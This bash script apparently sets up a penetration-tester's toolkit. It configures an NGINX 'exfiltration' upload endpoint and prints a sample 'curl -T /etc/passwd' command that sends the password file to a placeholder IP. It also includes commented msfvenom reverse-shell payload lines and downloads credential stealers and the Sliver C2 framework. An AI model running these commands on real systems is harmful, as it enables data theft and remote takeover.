#!/bin/bash


dldir="$HOME/Downloads"
homedir="$HOME"
kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color


source bash_tools.txt


function nginx_config {
    # Used to create an NGINX proxy for apache for web exfiltration 
    sudo mkdir -p /var/www/uploads/Exfil
    sudo chown -R www-data:www-data /var/www/uploads/Exfil
    sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf
    if [[ ! -e "/etc/nginx/sites-enabled/upload.conf" ]]; then
        sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
    fi
    sudo systemctl restart nginx.service
    sudo rm /etc/nginx/sites-enabled/default
    # Usage
    echo -e "\e[32mNGINX has been setup. To test the upload, try:\n"
    echo -e "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt\n\e[0m"
}


function msfdb_init {
    # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
    sudo systemctl start postgresql
    systemctl status postgresql
    sudo msfdb init
    echo "MSF Database Initialized"
    echo "Creating msfconsole.rc file"
    cp "${kit_location}/msfconsole.rc" "${HOME}/.msf4/msfconsole.rc"
    echo -e "\nHere is the status of msfdb:\n"
    sudo msfdb status
}

function neo4j_init {
    # TODO: Grab the port/service information and present to the user
    sudo mkdir -p /usr/share/neo4j/logs
    sudo touch /usr/share/neo4j/logs/neo4j.log
    sudo neo4j start
    echo "Neo4j service initialized"
}

function peas_download {
    # For the time being - just scrub the PEAS directory and re-obtain
    if [[ -d "${dldir}/PEAS" ]]; then
        # Lol, risky
        sudo rm -rf "${dldir}/PEAS"
        grab_peas
    else
        grab_peas
    fi
}

function grab_peas {
    linpeas_sh='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
    winpeas_bat='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
    winpeas_exe='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
    sudo mkdir "${dldir}/PEAS"
    sudo wget -qO "${dldir}/PEAS/linpeas.sh" "${linpeas_sh}"
    sudo chmod +x "${dldir}/PEAS/linpeas.sh"
    sudo wget -qO "${dldir}/PEAS/winpeas.bat" "${winpeas_bat}"
    sudo wget -qO "${dldir}/PEAS/winpeas.exe" "${winpeas_exe}"
}


tool_install() {
    cd "$dldir"
    structure_setup
    
    # Temp method to grab lazagne and the old firefox decrypt for python2
    lazagne_exe='https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
    sudo wget "$lazagne_exe" -qO "$dldir/lazagne.exe"
    
    ff_decrypt_old='https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
    sudo wget "$ff_decrypt_old" -qO "$dldir/FirefoxDecrypt_ForPython2"
    
    # End temp method
    
    is_repo_installed() {
        if [[ "$1" =~ https://.+/(.+)\.git ]]; then
            if [[ -d "./${BASH_REMATCH[1]}" ]]; then
                return 0
            fi
        else
            echo -e "\033[0;31mINVALID URL: $1\033[0m"
            # Returning 0 here because if the url isn't valid, then we definitely don't want to try installing
            return 0
        fi
        return 1
    }
    
    for git_url in "${GITHUBS[@]}"; do
        echo "Checking for local install of: $git_url"
        if is_repo_installed "$git_url"; then
            echo -e "\033[0;32mFound in current directory, continuing...\033[0m\n"
        else
            git clone "$git_url"
            echo -e "\033[0;32mRepo cloned! Moving on...\033[0m\n"
        fi
    done
    
    # Begin installing pypi & apt packages
    apt_command_string="sudo /usr/bin/apt install "
    for pkg in "${APT_PACKAGES[@]}"; do
        apt_command_string+="$pkg "
    done
    
    apt_install_subproc=$(sudo /bin/bash -c "$apt_command_string" 2>&1)
    apt_return_code=$?
    
    if [ "$apt_return_code" -ne 0 ]; then
        echo -e "\033[0;31m[!] apt encountered an error while running. Information follows\033[0m"
        echo -e "\033[0;31mapt return code: $apt_return_code\033[0m"
        echo -e "\033[0;37mapt stdout:\n$apt_install_subproc\033[0m"
    else
        echo -e "\033[0;32m[*] apt installed packages successfully\033[0m"
    fi
    
    for pkg in "${PYPI_PACKAGES[@]}"; do
        pip3 install "$pkg" 1>/dev/null
        echo -e "\033[0;32mPYPI $pkg successfully installed by script\033[0m"
    done
    
    peas_download
    sudo ln -s "$dldir/nmapAutomator/nmapAutomator.sh" /usr/local/bin/ && sudo chmod +x "$dldir/nmapAutomator/nmapAutomator.sh"
    
    echo "tool_install() Completed"
    return 0
}


tool_update() {
    nmap_update() {
        echo "Updating nmap script database"
        sudo nmap --script-updatedb 1>/dev/null
        echo -e "\033[0;32mnmap script database updated\033[0m\n"
    }

    rockyou() {
        echo "Checking if rockyou has been unzipped..."
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            echo "It hasn't been decompressed - decompressing now..."
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz
        else
            echo -e "\033[0;32mrockyou has already been unzipped\033[0m"
            echo -e "\033[0;32mSoftware & Tool updates have been completed!\033[0m"
        fi
    }

    echo "Updating searchsploit DB...."
    sudo searchsploit -u
    echo -e "\033[0;32mFinished searchsploit update\033[0m"

    echo "Updating locate DB..."
    sudo updatedb
    echo -e "\033[0;32mFinished locate DB update\033[0m"

    nmap_update
    rockyou

    return 0
}

shell_creation() {
  # This grabs the IP address of tun0 and uses it to start generating malicious binaries
  ## TODO: Create a method to select what interface you want to use
  # ip_addr=$(ip addr show tun0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # This port is used for malicious binary generation
  # listen_port=6969
  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # listen_port=6969
  echo "Interface address is: $ip_addr"
  echo "Port being used for shells is $listen_port"
  echo "                           Nice"
  # msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
  # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
  echo "Did I work? doubtful!"
}

c2_sliver_install() {
    # variable used for saving files
    c2_sliver_download_directory="$dldir/C2Frameworks"

    echo -e "\033[0;32m[*] sliver: Installing sliver...\033[0m"

    # Try to install mingw-w64 package for more advanced features
    echo -e "\033[0;32m[*] sliver: Installing mingw-w64 through apt\033[0m"
    sudo apt install -y mingw-w64 2>/dev/null 1>/dev/null

    # Clone source repo
    echo -e "\033[0;32m[*] sliver: Cloning source and Wiki repos to $c2_sliver_download_directory\033[0m"
    git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git" 2>/dev/null >/dev/null
    # Wiki for documentation reference
    git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git" 2>/dev/null >/dev/null

    # Binary releases
    echo -e "\033[0;32m[*] sliver: Downloading latest pre-compiled binary releases\033[0m"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"

    echo -e "\033[0;32m[*] sliver: Installation complete.\033[0m"
    return 0
}

hostfilereset() {
    sudo tee /etc/hosts 1>/dev/null < hosts.txt
    echo "Your /etc/hosts file has been reset"
}

structure_setup () {
    DIRS=("Linux" "Windows" "ActiveDirectory" "C2Frameworks" "Packages")
    for dir in "${DIRS[@]}"; do
        if [[ -d "${dldir}/${dir}" ]]; then
            echo "${dir} FOLDER EXISTS"
        else
            mkdir "${dldir}/${dir}"
            echo "created the ${dir} directory"
        fi
    done
}


sublime_install() {
    sublime='https://download.sublimetext.com/sublime-text_build-3211_amd64.deb'
    wget -qO "${dldir}/sublime.deb" "${sublime}"
    sudo dpkg -i "${dldir}/sublime.deb"
}

vscodium_install() {
    # Download the public GPG key for the repo and package if hasn't been downloaded already
    if [ ! -f '/usr/share/keyrings/vscodium-archive-keyring.gpg' ]; then
        echo -e "\e[32m[*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)\e[0m"
        wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
    else
        echo -e "\e[32m[*] VSCodium GPG key already downloaded\e[0m"
    fi

    # Add the repository if it hasn't been already
    if [ ! -f '/etc/apt/sources.list.d/vscodium.list' ]; then
        echo -e "\e[32m[*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/\e[0m"
        echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | sudo tee /etc/apt/sources.list.d/vscodium.list 1>/dev/null
    else
        echo -e "\e[32m[*] VSCodium repository already added\e[0m"
    fi

    # Refresh available packages and install codium
    echo -e "\e[32m[*] Installing VSCodium from repository\e[0m"
    sudo apt update 2>/dev/null 1>/dev/null && sudo apt install codium -y 2>/dev/null 1>/dev/null
    echo -e "\e[32m[*] VSCodium installed\e[0m"
}


system_update() {
    echo -e "${BLUE}Beginning System updates, please wait...${NC}"
    sublime_install
    vscodium_install
    tool_install
    tool_update
    sudo apt install python3-pip -y
    sudo apt update -y
    sudo apt upgrade -y
    sudo apt autoremove -y

    echo -e "${BLUE}Starting SSH service ...${NC}"
    sudo service ssh start

    echo -e "${GREEN}Finished SYSTEM setup${NC}"
}

function test {
    echo $(whoami) # The current user
    echo "Kit.py Location: $kit_location"
    echo $(sudo whoami) # This returns as root (since it's run as sudo)
    echo "Test Completed"
}

function jon {
    echo "Doing some work, here's a nice portrait, circa 2022 \n"
    echo "   -    \\\\O"
    echo "  -     /\\  "
    echo " -   __/\\ \`"
    echo "    \`    \\\\, (o)"
    echo "^^^^^^^^^^^\`^^^^^^^^"
    echo "Ol' Jon, kickin' them rocks again \n"
}